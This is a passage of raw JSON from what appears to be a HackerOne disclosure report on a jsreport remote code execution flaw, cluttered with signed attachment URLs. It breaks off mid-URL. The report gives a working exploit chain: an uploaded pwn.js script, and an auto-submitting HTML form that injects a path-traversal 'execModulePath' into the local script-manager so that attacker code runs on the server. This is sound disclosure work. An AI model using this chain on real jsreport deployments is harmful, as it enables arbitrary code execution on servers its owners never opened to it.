%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=04a05cecf67b1fbcfe9c024584a67d84593b17c4339ba4f7ef3157b880f25849\" data-attachment-type=\"image/png\"\u003escreen_5.png (F539735)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ethis script we will be able to execute on the server\u003c/p\u003e\n\n\u003cp\u003eso for demonstration purposes source code is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003econsole.log(\u0026#39;PWNED\u0026#39;)\nvar ls = require(\u0026#39;fs\u0026#39;).readdirSync(\u0026#39;./\u0026#39;)\nconsole.log(ls)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethe idea is to list files in the application root directory\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003einsert this source code into pwn.js\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"screen_6.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/736/5135895622dadd5e80418d50d4e838e4a31f48d5/screen_6.png?response-content-disposition=attachment%3B%20filename%3D%22screen_6.png%22%3B%20filename%2A%3DUTF-8%27%27screen_6.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=e71d2df243afd40a565e1ff8c147d46df8648713d76cace4c078bca5944ecdc0\" data-attachment-type=\"image/png\"\u003escreen_6.png (F539736)\u003c/a\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ecreate new template \u0026#39;test2\u0026#39;\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"screen_7.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/737/55eb919594e37cbcb27704ead50169081ec72e94/screen_7.png?response-content-disposition=attachment%3B%20filename%3D%22screen_7.png%22%3B%20filename%2A%3DUTF-8%27%27screen_7.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=5610085a8af6b16f7a99f9125951a9416a4ad1f0e979a64cb591aeb4b6b37ee4\" data-attachment-type=\"image/png\"\u003escreen_7.png (F539737)\u003c/a\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003einsert HTML code which will exploit the \u003ccode\u003escript-manager\u003c/code\u003e (change xxxx for the value of the previously found script-manager\u0026#39;s port) and click \u003ccode\u003eSave\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003edon\u0026#39;t forget to put the right port into code snippet\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003econtent=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text/html; charset=utf-8\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehttp-equiv=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Content-Type\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    123 \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003ex\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"c\"\u003e\u0026lt;!-- xxxx is the scipt-manager\u0026#39;s port --\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;pwn-form\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eenctype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text/plain\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://localhost:xxxx/\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;{\u0026quot;test\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u0026quot;:1, \u0026quot;options\u0026quot;: {\u0026quot;rid\u0026quot;: 12, \u0026quot;execModulePath\u0026quot;: \u0026quot;./../../../data/pwn.js/content.js\u0026quot;}}\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eform\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003epwn-form\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eform\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"screen_8.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/738/fc5d99368893d134234ed1004960d70d5e0075b8/screen_8.png?response-content-disposition=attachment%3B%20filename%3D%22screen_8.png%22%3B%20filename%2A%3DUTF-8%27%27screen_8.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=efcf6d8f2a1d3ac84913debbc2802564bef6ea6c1fec438697c38542fd1fa59e\" data-attachment-type=\"image/png\"\u003escreen_8.png (F539738)\u003c/a\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ethen click \u003ccode\u003eRun\u003c/code\u003e (don\u0026#39;t forget aboud \u0026#39;chrome-pdf\u0026#39; mode)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"screen_9.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/739/f0a0a5480f9a580158eb6476577b459feeb1d9ec/screen_9.png?response-content-disposition=attachment%3B%20filename%3D%22screen_9.png%22%3B%20filename%2A%3DUTF-8%27%27screen_9.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=158bbec1597e91b45a17b7233b02a1421a406463d9cde2af24a720b3e327176b\" data-attachment-type=\"image/png\"\u003escreen_9.png (F539739)\u003c/a\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eyou will see an error message as an output and result of \u0026#39;pwn.js\u0026#39; logged to console on the server\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"pwn.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/740/e0dbef4b6affd485c0228a345cf2b163af9777fd/pwn.png?response-content-disposition=attachment%3B%20filename%3D%22pwn.png%22%3B%20filename%2A%3DUTF-8%27%27pwn.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=df715a80c329c05e9382a36332e1731bd4df99a74b935964a1559aa01e42d519\" data-attachment-type=\"image/png\"\u003epwn.png (F539740)\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eOS: Linux Mint current\u003c/li\u003e\n\u003cli\u003eNode.js: 10.16.0\u003c/li\u003e\n\u003cli\u003eNPM: 6.9.0\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: Y\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker is able to create and execute js code on the server\u003c/p\u003e\n","weakness":{"id":71,"name":"Remote File Inclusion"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":539728,"file_name":"jsreport_scheme_(1).png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/728/4bcef07d8c457b011505e36657e313300500c3c4/jsreport_scheme_%281%29.png?response-content-disposition=attachment%3B%20filename%3D%22jsreport_scheme_%25281%2529.png%22%3B%20filename%2A%3DUTF-8%27%27jsreport_scheme_%25281%2529.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=c488a7abce1d2c5d1344d3193b931fb4b1d96c3706d5174c489cdaf0772f1832","file_size":85743,"type":"image/png"},{"id":539730,"file_name":"screen1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/730/d3baa0eba2551bb8141ff0772cf04c0933fdb684/screen1.png?response-content-disposition=attachment%3B%20filename%3D%22screen1.png%22%3B%20filename%2A%3DUTF-8%27%27screen1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=a83ae55ed2a5a54748c0c8962fce9d53c69f6f246013cfe275c92564d05d9818","file_size":24868,"type":"image/png"},{"id":539731,"file_name":"screen2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/731/14a391406a890e7451189416eacc3c6e73d29f7a/screen2.png?response-content-disposition=attachment%3B%20filename%3D%22screen2.png%22%3B%20filename%2A%3DUTF-8%27%27screen2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X